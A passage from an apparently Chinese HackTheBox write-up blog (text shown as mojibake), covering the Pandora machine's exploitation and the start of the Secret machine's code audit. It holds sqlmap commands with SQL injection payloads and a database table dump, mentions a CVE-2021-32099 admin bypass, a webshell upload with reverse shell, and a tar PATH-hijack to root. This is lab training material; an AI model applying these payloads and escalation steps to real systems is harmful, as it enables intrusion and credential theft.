alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæ€è·¯æ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«¯å£è½¬å‘æŠ€æœ¯ï¼Œå°†ç›®æ ‡æœºå™¨çš„80ç«¯å£è½¬å‘åˆ°æœ¬æœºçš„80ç«¯å£ä¸Šè¿›è¡Œè®¿é—®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 80:127.0.0.1:80 daniel@pandora.htb</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/caadd0a4e8a04a66950947136404bca3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç´§æ¥ç€æˆ‘ä»¬è®¿é—®æœ¬æœºçš„80ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªpandoraçš„FMSæ¡†æ¶æ­å»ºçš„webæœåŠ¡ï¼Œå¹¶ä¸”ç‰ˆæœ¬æ˜¯<code>v7.0NG.742</code><br><img src="https://img-blog.csdnimg.cn/cc07c69796d8428aa962521a3aba1d6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æœç´¢å¼•æ“ä¸Šæœåˆ°ï¼Œå­˜åœ¨SQLæ³¨å…¥çš„å¯èƒ½æ€§ï¼Œå¹¶ä¸”åœ¨ç›¸å¯¹åº”çš„ç›®å½•ä¸Šå­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚<br><img src="https://img-blog.csdnimg.cn/44fd0991127a4d16ba6a36debf10b49d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/84f551a7ff9e4e7b9e1224d1a92ac12a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é‚£ä¹ˆå°±ä½¿ç”¨SQLMAPè¿›è¡Œå°è¯•æ³¨å…¥å§ï¼Œç»“æœæ˜¾ç¤ºçœŸçš„å­˜åœ¨GETæ³¨å…¥ï¼Œæ•°æ®åº“ç±»å‹ä¸ºMySQL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot;</span> --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ed03893394f6472ea708afa9cf6bd75c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹æ•°æ®åº“åã€æ•°æ®è¡¨ç­‰ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/8269e50d7ce543b5a8db603075863fec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot;</span> --batch --dbms=mysql -D pandora --tables</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                       </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.6<span class="comment">#stable&#125;                                                                                                             </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                                                                          </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                                          </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                       </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 22:29:53 /2022-01-28/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:29:54] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[22:29:54] [WARNING] potential permission problems detected (&#x27;</span>Access denied<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;</span>PHPSESSID=6ehkvd19mc3...lt5pi9cq7a<span class="string">&#x27;). Do you want to use those [Y/n] Y</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: session_id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span></span><br><span class="line"><span class="string">    Payload: session_id=1&#x27;</span> AND 7308=(SELECT (CASE WHEN (7308=7308) THEN 7308 ELSE (SELECT 8935 UNION SELECT 7585) END))-- -</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: session_id=1<span class="string">&#x27; OR (SELECT 8665 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(8665=8665,1))),0x7171717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aGWu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: session_id=1&#x27;</span> AND (SELECT 3440 FROM (SELECT(SLEEP(5)))OagF)-- HMIA</span><br><span class="line">---</span><br><span class="line">[22:29:54] [INFO] testing MySQL</span><br><span class="line">[22:29:54] [INFO] confirming MySQL</span><br><span class="line">[22:29:54] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[22:29:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)</span><br><span class="line">web application technology: Apache 2.4.41, PHP</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="line">[22:29:54] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;pandora&#x27;</span></span><br><span class="line">Database: pandora</span><br><span class="line">[178 tables]</span><br><span class="line">+------------------------------------+</span><br><span class="line">| taddress                           |</span><br><span class="line">| taddress_agent                     |</span><br><span class="line">| tagent_access                      |</span><br><span class="line">| tagent_custom_data                 |</span><br><span class="line">| tagent_custom_fields               |</span><br><span class="line">| tagent_custom_fields_filter        |</span><br><span class="line">| tagent_module_inventory            |</span><br><span class="line">| tagent_module_log                  |</span><br><span class="line">| tagent_repository                  |</span><br><span class="line">| tagent_secondary_group             |</span><br><span class="line">| tagente                            |</span><br><span class="line">| tagente_datos                      |</span><br><span class="line">| tagente_datos_inc                  |</span><br><span class="line">| tagente_datos_inventory            |</span><br><span class="line">| tagente_datos_log4x                |</span><br><span class="line">| tagente_datos_string               |</span><br><span class="line">| tagente_estado                     |</span><br><span class="line">| tagente_modulo                     |</span><br><span class="line">| talert_actions                     |</span><br><span class="line">| talert_commands                    |</span><br><span class="line">| talert_snmp                        |</span><br><span class="line">| talert_snmp_action                 |</span><br><span class="line">| talert_special_days                |</span><br><span class="line">| talert_template_module_actions     |</span><br><span class="line">| talert_template_modules            |</span><br><span class="line">| talert_templates                   |</span><br><span class="line">| tattachment                        |</span><br><span class="line">| tautoconfig                        |</span><br><span class="line">| tautoconfig_actions                |</span><br><span class="line">| tautoconfig_rules                  |</span><br><span class="line">| tcategory                          |</span><br><span class="line">| tcluster                           |</span><br><span class="line">| tcluster_agent                     |</span><br><span class="line">| tcluster_item                      |</span><br><span class="line">| tcollection                        |</span><br><span class="line">| tconfig                            |</span><br><span class="line">| tconfig_os                         |</span><br><span class="line">| tcontainer                         |</span><br><span class="line">| tcontainer_item                    |</span><br><span class="line">| tcredential_store                  |</span><br><span class="line">| tdashboard                         |</span><br><span class="line">| tdatabase                          |</span><br><span class="line">| tdeployment_hosts                  |</span><br><span class="line">| tevent_alert                       |</span><br><span class="line">| tevent_alert_action                |</span><br><span class="line">| tevent_custom_field                |</span><br><span class="line">| tevent_extended                    |</span><br><span class="line">| tevent_filter                      |</span><br><span class="line">| tevent_response                    |</span><br><span class="line">| tevent_rule                        |</span><br><span class="line">| tevento                            |</span><br><span class="line">| textension_translate_string        |</span><br><span class="line">| tfiles_repo                        |</span><br><span class="line">| tfiles_repo_group                  |</span><br><span class="line">| tgis_data_history                  |</span><br><span class="line">| tgis_data_status                   |</span><br><span class="line">| tgis_map                           |</span><br><span class="line">| tgis_map_connection                |</span><br><span class="line">| tgis_map_has_tgis_map_con          |</span><br><span class="line">| tgis_map_layer                     |</span><br><span class="line">| tgis_map_layer_groups              |</span><br><span class="line">| tgis_map_layer_has_tagente         |</span><br><span class="line">| tgraph                             |</span><br><span class="line">| tgraph_source                      |</span><br><span class="line">| tgraph_source_template             |</span><br><span class="line">| tgraph_template                    |</span><br><span class="line">| tgroup_stat                        |</span><br><span class="line">| tgrupo                             |</span><br><span class="line">| tincidencia                        |</span><br><span class="line">| titem                              |</span><br><span class="line">| tlanguage                          |</span><br><span class="line">| tlayout                            |</span><br><span class="line">| tlayout_data                       |</span><br><span class="line">| tlayout_template                   |</span><br><span class="line">| tlayout_template_data              |</span><br><span class="line">| tlink                              |</span><br><span class="line">| tlocal_component                   |</span><br><span class="line">| tlog_graph_models                  |</span><br><span class="line">| tmap                               |</span><br><span class="line">| tmensajes                          |</span><br><span class="line">| tmetaconsole_agent                 |</span><br><span class="line">| tmetaconsole_agent_secondary_group |</span><br><span class="line">| tmetaconsole_event                 |</span><br><span class="line">| tmetaconsole_event_history         |</span><br><span class="line">| tmetaconsole_setup                 |</span><br><span class="line">| tmigration_module_queue            |</span><br><span class="line">| tmigration_queue                   |</span><br><span class="line">| tmodule                            |</span><br><span class="line">| tmodule_group                      |</span><br><span class="line">| tmodule_inventory                  |</span><br><span class="line">| tmodule_relationship               |</span><br><span class="line">| tmodule_synth                      |</span><br><span class="line">| tnetflow_filter                    |</span><br><span class="line">| tnetflow_report                    |</span><br><span class="line">| tnetflow_report_content            |</span><br><span class="line">| tnetwork_component                 |</span><br><span class="line">| tnetwork_component_group           |</span><br><span class="line">| tnetwork_map                       |</span><br><span class="line">| tnetwork_matrix                    |</span><br><span class="line">| tnetwork_profile                   |</span><br><span class="line">| tnetwork_profile_component         |</span><br><span class="line">| tnetworkmap_ent_rel_nodes          |</span><br><span class="line">| tnetworkmap_enterprise             |</span><br><span class="line">| tnetworkmap_enterprise_nodes       |</span><br><span class="line">| tnews                              |</span><br><span class="line">| tnota                              |</span><br><span class="line">| tnotification_group                |</span><br><span class="line">| tnotification_source               |</span><br><span class="line">| tnotification_source_group         |</span><br><span class="line">| tnotification_source_group_user    |</span><br><span class="line">| tnotification_source_user          |</span><br><span class="line">| tnotification_user                 |</span><br><span class="line">| torigen                            |</span><br><span class="line">| tpassword_history                  |</span><br><span class="line">| tperfil                            |</span><br><span class="line">| tphase                             |</span><br><span class="line">| tplanned_downtime                  |</span><br><span class="line">| tplanned_downtime_agents           |</span><br><span class="line">| tplanned_downtime_modules          |</span><br><span class="line">| tplugin                            |</span><br><span class="line">| tpolicies                          |</span><br><span class="line">| tpolicy_agents                     |</span><br><span class="line">| tpolicy_alerts                     |</span><br><span class="line">| tpolicy_alerts_actions             |</span><br><span class="line">| tpolicy_collections                |</span><br><span class="line">| tpolicy_groups                     |</span><br><span class="line">| tpolicy_modules                    |</span><br><span class="line">| tpolicy_modules_inventory          |</span><br><span class="line">| tpolicy_plugins                    |</span><br><span class="line">| tpolicy_queue                      |</span><br><span class="line">| tprofile_view                      |</span><br><span class="line">| tprovisioning                      |</span><br><span class="line">| tprovisioning_rules                |</span><br><span class="line">| trecon_script                      |</span><br><span class="line">| trecon_task                        |</span><br><span class="line">| trel_item                          |</span><br><span class="line">| tremote_command                    |</span><br><span class="line">| tremote_command_target             |</span><br><span class="line">| treport                            |</span><br><span class="line">| treport_content                    |</span><br><span class="line">| treport_content_item               |</span><br><span class="line">| treport_content_item_temp          |</span><br><span class="line">| treport_content_sla_com_temp       |</span><br><span class="line">| treport_content_sla_combined       |</span><br><span class="line">| treport_content_template           |</span><br><span class="line">| treport_custom_sql                 |</span><br><span class="line">| treport_template                   |</span><br><span class="line">| treset_pass                        |</span><br><span class="line">| treset_pass_history                |</span><br><span class="line">| tserver                            |</span><br><span class="line">| tserver_export                     |</span><br><span class="line">| tserver_export_data                |</span><br><span class="line">| tservice                           |</span><br><span class="line">| tservice_element                   |</span><br><span class="line">| tsesion                            |</span><br><span class="line">| tsesion_extended                   |</span><br><span class="line">| tsessions_php                      |</span><br><span class="line">| tskin                              |</span><br><span class="line">| tsnmp_filter                       |</span><br><span class="line">| ttag                               |</span><br><span class="line">| ttag_module                        |</span><br><span class="line">| ttag_policy_module                 |</span><br><span class="line">| ttipo_modulo                       |</span><br><span class="line">| ttransaction                       |</span><br><span class="line">| ttrap                              |</span><br><span class="line">| ttrap_custom_values                |</span><br><span class="line">| tupdate                            |</span><br><span class="line">| tupdate_journal                    |</span><br><span class="line">| tupdate_package                    |</span><br><span class="line">| tupdate_settings                   |</span><br><span class="line">| tuser_double_auth                  |</span><br><span class="line">| tuser_task                         |</span><br><span class="line">| tuser_task_scheduled               |</span><br><span class="line">| tusuario                           |</span><br><span class="line">| tusuario_perfil                    |</span><br><span class="line">| tvisual_console_elements_cache     |</span><br><span class="line">| twidget                            |</span><br><span class="line">| twidget_dashboard                  |</span><br><span class="line">+------------------------------------+</span><br><span class="line"></span><br><span class="line">[22:29:54] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/127.0.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 22:29:54 /2022-01-28/</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé‡ç‚¹å…³æ³¨ä¸¤ä¸ªæ•°æ®åº“<code>tsessions_php</code>å’Œ<code>tpassword_history</code>ï¼Œåˆ†åˆ«å¯¹è¿™ä¸¤ä¸ªæ•°æ®è¡¨çš„å­—æ®µå†…å®¹è¿›è¡Œæ³¨å…¥åˆ†æã€‚å› ä¸ºtsessions_phpçš„å­—æ®µå†…å®¹æ¯”è¾ƒå¤šï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ä¸»è¦åˆ†æçš„æ˜¯åè€…çš„å­—æ®µå†…å®¹ä¿¡æ¯ã€‚<br><img src="https://img-blog.csdnimg.cn/b7e6dbfbe3d443c78888e862a89eed3e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/b6bded70d34c46b1a18a13a217c21b7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot;</span> --batch --dbms=mysql -D pandora -T tpassword_history -C date_begin,date_end,id_pass,id_user,password --dump</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°äº†mattç”¨æˆ·çš„hashå€¼ï¼Œä½†æ˜¯å¾ˆå¯æƒœå¹¶ä¸èƒ½è§£å¯†å‡ºå¯¹åº”çš„æ˜æ–‡å€¼ä¿¡æ¯ã€‚å› æ­¤æˆ‘ä»¬åªèƒ½æ¢ä¸€ä¸ªæ€è·¯äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/6f758c4b67394f73be33a91e9518b67c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç»§ç»­åœ¨ç½‘ä¸ŠæŸ¥é˜…èµ„æ–™å‘ç°ï¼Œå­˜åœ¨ä¸€ä¸ªpocèƒ½ç›´æ¥ä½¿ç”¨adminè´¦æˆ·è¿›è¡Œç™»å½•åå°ï¼Œè¿™æ˜¯é“¾æ¥åœ°å€<a href="https://github.com/zjicmDarkWing/CVE-2021-32099">https://github.com/zjicmDarkWing/CVE-2021-32099</a><br><img src="https://img-blog.csdnimg.cn/98310996012a4ee6b1a2c970d72d04ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•æˆåŠŸåï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ webshell<br><img src="https://img-blog.csdnimg.cn/a47737aa634c4cec91d3fd880a38c75d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>éšä¾¿ç‚¹å‡»ä¸€ä¸ªç›®å½•ï¼Œurlä¸Šæç¤ºæ˜¯imagesç›®å½•<br><img src="https://img-blog.csdnimg.cn/e1ee7e89e35c4b97b1c0f57895caded0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ webshellåï¼Œæ‰“å¼€ç›‘å¬å¹¶è·å–åå¼¹çš„shell<br><img src="https://img-blog.csdnimg.cn/2f98f37576d14269a134646cf7a3e27f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒROOT"><a href="#ææƒROOT" class="headerlink" title="ææƒROOT"></a>ææƒROOT</h2><p>è·å–åˆ°mattç”¨æˆ·çš„æƒé™åï¼Œæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªç›®æ ‡å°±æ˜¯æœ€é«˜æƒé™äº†ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆæŸ¥çœ‹å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½æœ‰å“ªäº›ã€‚æœ€æ˜¾çœ¼çš„æ˜¯<code>/usr/bin/pandora_backup</code>è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ‰§è¡Œå®ƒã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/98051e0814b44154b2e0ab038a77f571.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æŠ¥äº†æƒé™ä¸å¤Ÿçš„é”™è¯¯ï¼Œå¹¶ä¸”ä¸ä½†æƒé™ä¸å¤Ÿï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shellå¤–å£³ã€‚<br><img src="https://img-blog.csdnimg.cn/e1ae01ac699e4398bdc9dc69a131fc44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç”±äºæˆ‘ä»¬å¹¶æ²¡æœ‰è§£å¯†åˆ°mattç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½æ‰‹æ’•sshè¿æ¥äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/6cd2cba3f9724a5aa9e3ffff6c345b8f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”Ÿæˆäº†id_rsaæ–‡ä»¶åï¼Œæˆ‘ä»¬å¾—å†ç”Ÿæˆä¸€ä¸ªéªŒè¯æ–‡ä»¶ï¼Œå¹¶ä¸”å…¨éƒ¨éƒ½è®¾ç½®ä¸ºå¯è¯»å¯å†™æƒé™ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œã€‚<br><img src="https://img-blog.csdnimg.cn/ebcbf9930fdc474ca8cc9b360eb48af6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬æŠŠid_rsaçš„å†…å®¹ä¿å­˜åœ¨æœ¬åœ°ä¸Š<br><img src="https://img-blog.csdnimg.cn/fb32e81db1424168bfc18bcba009b3c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7db0877f59e04a3595eea89001efb8ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†æ¬¡æ‰§è¡Œä¹‹å‰çš„å¤‡ä»½å‘½ä»¤æ—¶ï¼Œå‘ç°æ‰§è¡ŒæˆåŠŸäº†<br><img src="https://img-blog.csdnimg.cn/5d11948fcb0248849fb147a9ca08d345.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬çš„æ€è·¯åˆæ¥äº†ï¼Œæ—¢ç„¶è¿™ä¸ªæ˜¯ä¸ªå¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†rootçš„shellè·¯å¾„å†™å…¥åˆ°tarå‘½ä»¤ä¸­ï¼Œä»è€Œè·å–æœ€é«˜çš„æƒé™ã€‚<br><img src="https://img-blog.csdnimg.cn/3491c9fa9d5c4fda99e0b2c641d66904.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><img src="https://img-blog.csdnimg.cn/83e5ff7b6e2e4c56afd37607ba212552.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªéš¾åº¦é€‚ä¸­çš„é¶æœºï¼Œç›¸ä¿¡ä¸€å¼€å§‹è·å–snmpçªç ´å£é‚£é‡Œå·²ç»æ­»äº†ä¸€å¤§éƒ¨åˆ†äººäº†ï¼Œç„¶åå°±æ˜¯åé¢sqlæ³¨å…¥æˆåŠŸåä½†æ˜¯å´æ²¡æ³•è§£å¯†ï¼Œæ‰€ä»¥è¿™ä¸ªé¶æœºç›¸å½“å‡ºè‰²ï¼Œæ¯”è¾ƒè€ƒéªŒæ¼æ´å¤ç°çš„æŠ€èƒ½ã€‚</p>
]]></content>
      <categories>
        <category>CMS</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Secret</title>
    <url>/2022/01/18/Secret/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†webæœåŠ¡å’ŒsshæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/bcfdfdf3f8f34f54b9cef39a2bfd9e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ™®é€šçš„ç½‘ç«™<br><img src="https://img-blog.csdnimg.cn/ebaa1c867d244570a8bbaee74355eb78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æ¢æµ‹è·¯å¾„å¹¶æ²¡æœ‰å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°†æºç ä¸‹è½½ä¸‹æ¥è¿›è¡Œä»£ç å®¡è®¡ã€‚åœ¨routesæ–‡ä»¶å¤¹ä¸‹ï¼Œæœ‰4ä¸ªjsæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/9819cf6cb2214d76bce1c74ff577d39e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹auth.jsæ–‡ä»¶</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>).Router();</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../model/user&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">&#x27;bcryptjs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; registerValidation, loginValidation&#125; = <span class="built_in">require</span>(<span class="string">&#x27;../validations&#x27;</span>)</span><br><span 